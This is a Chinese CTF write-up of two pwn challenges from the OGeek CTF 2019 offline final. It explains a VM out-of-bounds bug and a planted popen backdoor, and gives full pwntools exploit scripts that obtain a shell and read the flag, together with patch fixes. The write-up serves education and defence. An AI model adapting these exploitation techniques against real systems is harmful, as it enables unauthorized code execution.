# OGeek CTF 2019 线下决赛 pwn 题解

阅读量 **926038**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-09-30 10:30:14

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01b157e284c733a5c1.jpg)

第一次参加线下赛，感觉还是很不错的，就是自己太菜了。从比赛中也发现了自己的一些缺点，比如做题的速度太慢了（菜鸟的特性），还好这次比赛防御方也能拿到很高的分，这才没有拖队友后腿。

OGeek CTF 2019 线下决赛 pwn 题解

源程序下载，修复后的程序也在链接中：<https://github.com/Ex-Origin/ctf-writeups/tree/master/ogeekctf2019_final/pwn>。

## ovm

一个模拟的虚拟机，难度比`byte ctf 2019 的
ezarch`要小，溢出点主要是对于`reg`、`memory`和`stack`的偏移没有限制，使得其可以向上，或者向下溢出。

虽然可以溢出，但是由于偏移的变量是`int`型，所以下溢是基本没有什么用的，因为`libc`和程序基地址的差比这个大多了，所以只能采取向上溢出的策略，读取got表地址，然后利用虚拟程序的特性进行加减偏移，从而劫持`comment`变量，使其指向hook，在最后的`sendcomment`中会直接触发hook。

这里我刚开始的犯了一个错误，我是直接用`IDA`反汇编进行查看的，看到的`index`是`_DWORD`类型的，所以我就下意识的以为`index`是属于`unsigned
int`型变量，所以以为是不可能发生上溢的情况的，直到我直接看汇编代码才发现，`index`是有符号位扩展指令的（`movsxd`)，所以`index`的类型应该是`int`型。这里我的失误是太依赖于工具了。如果直接看汇编代码就能一眼看出其类型。

下面我总结了程序中的上溢读和上溢写。

下面是上溢读代码：

    
    
    ;// reg[three_byte] = memory[reg[one_byte]];
    loc_EEE:
    movzx   ecx, [rbp+three_byte]
    movzx   edx, [rbp+one_byte]
    lea     rax, reg
    movsxd  rdx, edx
    mov     edx, [rax+rdx*4]
    lea     rax, memory
    movsxd  rdx, edx
    mov     eax, [rax+rdx*4]
    mov     esi, eax
    lea     rax, reg
    movsxd  rdx, ecx
    mov     [rax+rdx*4], esi
    jmp     loc_1205
    

第二处：

    
    
    ;// reg[three_byte] = stack[--reg[13]];     // stack
    loc_F95:
    movzx   ecx, [rbp+three_byte]
    lea     rax, reg
    mov     eax, [rax+34h]
    lea     edx, [rax-1]
    lea     rax, reg
    mov     [rax+34h], edx
    lea     rax, reg
    mov     edx, [rax+34h]
    lea     rax, stack
    movsxd  rdx, edx
    mov     eax, [rax+rdx*4]
    mov     esi, eax
    lea     rax, reg
    movsxd  rdx, ecx
    mov     [rax+rdx*4], esi
    jmp     loc_1205
    

上面的代码可以先通过下溢修改`reg[13]`的值，然后在进行符号位扩展。这样也能像`memory`一样实现上溢。

下面是上溢写的代码：

    
    
    ;// memory[reg[one_byte]] = reg[three_byte];
    loc_F24:
    movzx   edx, [rbp+one_byte]
    lea     rax, reg
    movsxd  rdx, edx
    mov     ecx, [rax+rdx*4]
    movzx   edx, [rbp+three_byte]
    lea     rax, reg
    movsxd  rdx, edx
    mov     eax, [rax+rdx*4]
    mov     esi, eax
    lea     rax, memory
    movsxd  rdx, ecx
    mov     [rax+rdx*4], esi
    jmp     loc_1205
    

第二处：

这里的利用方式和第二种上溢读的原理一样。

    
    
    ;// v1 = reg[13];
    ;// reg[13] = v1 + 1;
    ;// stack[v1] = reg[three_byte];
    loc_F5A:
    lea     rax, reg
    mov     eax, [rax+34h]
    lea     ecx, [rax+1]
    lea     rdx, reg
    mov     [rdx+34h], ecx
    movzx   ecx, [rbp+three_byte]
    lea     rdx, reg
    movsxd  rcx, ecx
    mov    edx , [rdx+rcx*4]
    mov     ecx, edx
    lea     rdx, stack
    cdqe
    mov     [rdx+rax*4], ecx
    jmp     loc_1205
    

上面这段汇编中，因为对`index`进行了`cdqe`符号位扩展，所以可以向上溢出。

综上所述，只要任意一个上溢读和上溢写结合，就能使得漏洞被利用。

**利用脚本：**

这里我只写了最为简单的一种利用方式。

    
    
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    
    #     '''
    
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = 'error'
    execve_file = './ovm'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    # sh = process(execve_file)
    
    # host = '10.0.%s.2' % sys.argv[1]
    # sh = remote(host, 10990)
    # elf = ELF(execve_file)
    # # libc = ELF('./libc-2.27.so')
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        # b execute
        # b fetch
        b sendcomment
        b *$rebase(0xF24)
        '''
    
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
    
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    
    def main(id):
        host = '10.0.%s.2' % id
        sh = remote(host, 10990)
        sh.sendlineafter('PC: ', '2')
        sh.sendlineafter('SP: ', '0')
        layout = [ # 1098
            u32((p8(0x10)+p8(0)+p8(0)+p8(8))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(1)+p8(0xff))[::-1]) ,
            u32((p8(0xc0)+p8(2)+p8(1)+p8(0))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0xc0)+p8(2)+p8(2)+p8(0))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0xc0)+p8(2)+p8(2)+p8(0))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(2)+p8(0xc6))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0x30)+p8(9)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0x10)+p8(1)+p8(2)+p8(1))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0x30)+p8(10)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0x10)+p8(1)+p8(5)+p8(0x10))[::-1]) ,
            u32((p8(0xc0)+p8(5)+p8(1)+p8(0))[::-1]) ,
            u32((p8(0x10)+p8(1)+p8(5)+p8(0x98))[::-1]) ,
            u32((p8(0x70)+p8(5)+p8(1)+p8(5))[::-1]) ,
    
    
            u32((p8(0x70)+p8(9)+p8(9)+p8(5))[::-1]) ,
    
            u32((p8(0x10)+p8(1)+p8(5)+p8(49))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(2)+p8(1))[::-1]) ,
    
            u32((p8(0x40)+p8(9)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0x10)+p8(1)+p8(2)+p8(1))[::-1]) ,
            u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
    
            u32((p8(0x40)+p8(10)+p8(1)+p8(2))[::-1]) ,
    
    
            u32((p8(0xff)+p8(0)+p8(0)+p8(0xff))[::-1]),
        ]
        sh.sendlineafter('CODE SIZE: ', str(len(layout)))
        sh.recvuntil('CODE: ')
    
        # pause()
        for v in layout:
            sh.sendline(str(v))
        sh.recvuntil('R9: ')
        low_byte = int(sh.recvuntil('n'), 16)
        sh.recvuntil('R10: ')
        high_byte = int(sh.recvuntil('n'), 16)
    
        system_addr = high_byte * 0x100000000 + low_byte - 0x39e4a0
        log.success('system_addr: ' + hex(system_addr))
    
        sh.send('/bin/sh' + p64(system_addr))
        sh.sendline('cat flag')
        sh.recvuntil('x00By')
        return sh.recvuntil('n')
    
    if __name__ == "__main__":
        host = '10.0.%s.2' % sys.argv[1]
        print(main(sys.argv[1]))
    

###  修复

要修复也比较简单，只要去掉程序的符号位扩展指令就行了，这样程序就无论如何都无法上溢了，但是有一点要特别注意，一定要修复完全，不然就可能被利用其它的漏洞组合打通，修改下溢漏洞是很困难的，而且根本没有必要，所以可以直接不管。

## rpc

这题在比赛时，我并没有写出来，但是这题应该只有两个后门漏洞，而且挺明显的，通过查找危险函数就能发现其不对劲，由于并不存在较深的逻辑漏洞，所以这题也守住了。

**预置后门：**

    
    
    void __fastcall back_door(int a1)
    {
        ...
        read(a1, v4, 0x24uLL);
        sub_20D7((__int64)v4, 0x24u);
        if ( (unsigned int)sub_213D((__int64)v4, (const char *)patched_keys) != 0 )
        {
          write(1, "RPCN", 0xCuLL);
        }
        else
        {
          read(a1, s, 4uLL);
          v2 = (s[1] << 16) + s[3] + (s[2] << 8) + (*s << 24);
          if ( v2 <= 0x16 )
          {
            read(a1, command, v2);
            v7 = (char *)malloc(0x32uLL);
            memset(v7, 0, 0x32uLL);
            stream = popen(command, "r");
            if ( stream != 0LL )
            {
              fgets(v7, 50, stream);
              v1 = strlen(v7);
              write(1, v7, v1);
              pclose(stream);
            }
            ...
    }
    

这个后门可以直接`nop`掉`popen`函数，比赛中我直接把这个函数改成了`exit`，因为check并不会去检查后门，所以这样做是没问题的。

**另一个后门：**

    
    
    __int64 __fastcall sub_1AEC(signed int *a1)
    {
      char *buf; // [rsp+18h] [rbp-58h]
      char v3; // [rsp+20h] [rbp-50h]
      unsigned __int64 v4; // [rsp+68h] [rbp-8h]
    
      v4 = __readfsqword(0x28u);
      read(0, &buf, 8uLL);
      printf("%s", buf);
      read(0, &v3, *a1);
      return 0LL;
    }
    

明显的栈溢出，读取的长度用户可控，修复的方法就直接将第三个参数改成`0x48`就行，这样就溢不到栈上了。

###  赛后复现

一个模拟通信协议的程序，其难点在于了解其协议，比赛结束后，我花了很多时间研究该程序，问了很多师傅们，这里要感谢`丁佬`的指点。

分析程序的时候，我发现了一个现象，这个现象应该是大部分人开发时都会有的，就是设置的变量都是有意义的，这样就会让我们对变量重复使用，然后我们就可以利用该行为通过其重复使用的代码段一起来分析该变量的具体作用，这样能帮助我们更好地理解程序的行为。一般应对这样的情况，最好的办法就是多自己改变量名，让其从一些无意义的变量名中区分出来。

接下来就是如何解题。

经过`丁佬`提示，发现这题使用的是`ciscn2018`的出题模板，该题就是由下面的程序改编而来的。

<https://github.com/sherlly/ciscn2018-pwn/blob/master/source/calc.c>

这个模板也是出自`丁佬`之手。

通过分析代码，就能发现函数中的类的虚指针表中，有一个写指针的函数和一个读指针内容的函数，联合起来就能任意地址读，这样的话就能利用上面的两个后门。

###  思路

我使用的是第一个后门，首先将利用虚指针表中的函数在数组中写入`malloc`出的地址，将其利用`sprintf`泄露出来，然后就能计算出`heap`基地址。

之后利用`heap`基地址偏移找到class的虚函数指针，并泄露出来，通过该指针就能计算出程序基地址。

然后在泄露出陈旭一开始读取的随机字符串，通过解密函数还原就能得到通过后门的`key`，这样就能利用`popen`执行任意代码了。

**利用脚本：**

    
    
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    
    #     '''
    
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = 'debug'
    execve_file = './rpc'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    sh = process(execve_file)
    # sh = remote('', 0)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        b *$rebase(0x213D)
        b *$rebase(0x22F4)
        '''
    
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
    
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    
    
    def reverse_int(value): return p32(value, endian = 'big')
    def reverse_size_t(value): return p64(value, endian = 'big')
    
    # pause()
    # login
    sh.send('RPCM')
    sh.send(reverse_int(0))
    sh.send(reverse_int(1))
    
    sh.recvuntil('xbexf2')
    uuid = sh.recvn(u32(sh.recvn(4), endian = 'big'))
    log.success('uuid: ' + (uuid))
    
    # malloc
    packet = reverse_int(0x2) + reverse_int(0) + reverse_int(0x8) + 'a' * 8
    sh.send('RPCM')
    sh.send(reverse_int(32))
    sh.send(reverse_int(5))
    sh.send(packet)
    sh.recvuntil('xbexef')
    
    # add into message queue
    sh.send('RPCM')
    sh.send(reverse_int(8 + len(uuid) + 28))
    sh.send(reverse_int(5))
    packet = reverse_int(0x3) + reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'b' * 8 +reverse_int(0)
    sh.send(packet)
    sh.recvuntil('xbexef')
    
    # leak
    sh.send('RPCM')
    sh.send(reverse_int(8 + len(uuid) + 20))
    sh.send(reverse_int(2))
    packet = reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'b' * 8
    sh.send(packet)
    sh.recvuntil('xbexf2')
    result = sh.recvn(u32(sh.recvn(4), endian = 'big'))
    heap_addr = int(result, 10) - 0x12c90
    log.success('heap_addr: ' + hex(heap_addr))
    
    
    def leak(addr):
        # set ptr
        sh.send('RPCM')
        sh.send(reverse_int(28))
        sh.send(reverse_int(5))
        packet = reverse_int(4) + reverse_int(0) + reverse_size_t(addr)
        sh.send(packet)
        sh.recvuntil('xbexef')
    
        # add into message queue
        sh.send('RPCM')
        sh.send(reverse_int(8 + len(uuid) + 28))
        sh.send(reverse_int(5))
        packet = reverse_int(0x1) + reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'c' * 8 +reverse_int(0)
        sh.send(packet)
        sh.recvuntil('xbexef')
    
        # leak
        sh.send('RPCM')
        sh.send(reverse_int(8 + len(uuid) + 20))
        sh.send(reverse_int(2))
        packet = reverse_int(len(uuid)) + uuid + reverse_int(0x8) + 'c' * 8
        sh.send(packet)
        sh.recvuntil('xbexf2')
        return sh.recvn(u32(sh.recvn(4), endian = 'big'))
    
    result = leak(heap_addr + 0x11e70)
    image_base_addr = u64(result.ljust(8, '')) - 0x20cc58
    log.success('image_base_addr: ' + hex(image_base_addr))
    random_buf_addr = image_base_addr + 0x20D180
    log.info('random_buf_addr: ' + hex(random_buf_addr))
    
    random_buf = leak(random_buf_addr) + leak(random_buf_addr + 8)
    
    def sub_1E02(arg_buf):
        import ctypes
        out = [v for v in range(256)]
        temp_buf = [ord(v) for v in arg_buf] * 0x10
        v6 = 0
        for j in range(256):
            v6 = (v6 + out[j] + temp_buf[j]) & 0xff
            v3 = out[j]
            out[j] = out[v6]
            out[v6] = v3
    
        return out
    
    def sub_1FA0(arg_1):
        patched_key = [0xFB, 0x60, 0xBB, 0x8C, 0x67, 0x76, 0x19, 0xB6, 0xAE, 0x9B, 0x17, 0x7C, 0xB1, 0x3D, 0xBB, 0x80,
                        0x26, 0xF0, 0x0E, 0x9F, 0x04, 0xD2, 0xC6, 0x5D, 0xFE, 0x79, 0x2F, 0xCE, 0x28, 0xA7, 0xFF, 0xE0,
                        0xC2, 0xBB, 0xC5, 0xF2]
        v5 = 0
        v6 = 0
        out = []
    
        for i in range(0x24):
            v5 = (v5 + 1) & 0xff
            v6 = (arg_1[v5] + v6) & 0xff
            v3 = arg_1[v5]
            arg_1[v5] = arg_1[v6]
            arg_1[v6] = v3
            out += [arg_1[(arg_1[v5] + arg_1[v6]) & 0xff] ^ patched_key[i]]
    
        out = [chr(v) for v in out]
        return ''.join(out)
    
    result = sub_1E02(random_buf)
    key = sub_1FA0(result)
    
    # backdoor
    sh.send('RPCM')
    sh.send(reverse_int(0))
    sh.send(reverse_int(6))
    sh.send(reverse_int(0x24))
    sh.send(key)
    sh.send(reverse_int(0x16))
    sh.sendline('cat flag')
    
    sh.interactive()
    clear()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Ex** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/187516](/post/id/187516)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __15赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=1fhFH73MfUueW4UicNIOKJQ&s=40&t=1557163170)
Ex

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

